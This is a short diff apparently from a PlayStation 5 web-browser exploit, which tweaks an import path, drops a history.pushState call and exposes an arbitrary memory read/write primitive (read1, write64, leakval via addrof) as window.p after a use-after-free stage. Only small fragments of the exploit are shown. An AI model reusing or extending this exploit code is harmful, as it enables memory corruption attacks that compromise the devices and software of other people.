@@ -22,7 +22,7 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // * PS5 [1.00, 6.00)
 
 import { Int } from '/module/int64.js';
-import { Memory, mem } from '/module/mem.js';
+import { Memory, mem } from './module/mem.js';
 import { KB, MB } from '/module/offset.js';
 import { BufferView } from '/module/rw.js';
 
@@ -151,7 +151,6 @@ function prepare_uaf() {
             fsets.push(fset);
         }
     }
-    history.pushState('state0', ''); // new line
 
     alloc_fs(fsets, num_fsets);
 
@@ -805,7 +804,10 @@ async function run() {
 
     debug_log('STAGE: achieve arbitrary read/write primitive');
     await make_arw(rdr, view2, pop);
-    window.p = {
+
+    //clear_log();
+    // path to your script that will use the exploit
+    let prim = {
         read1(addr) {
             addr = new Int(addr.low, addr.hi);
             const res = mem.read8(addr);
@@ -846,13 +848,13 @@ async function run() {
             } else {
                 mem.write64(addr, new Int(value));
             }
-
         },
         leakval(obj) {
             const res = mem.addrof(obj);
             return new int64(res.low, res.high);
         }
     };
+    window.p = prim;       
     run_hax();
 }
 run();
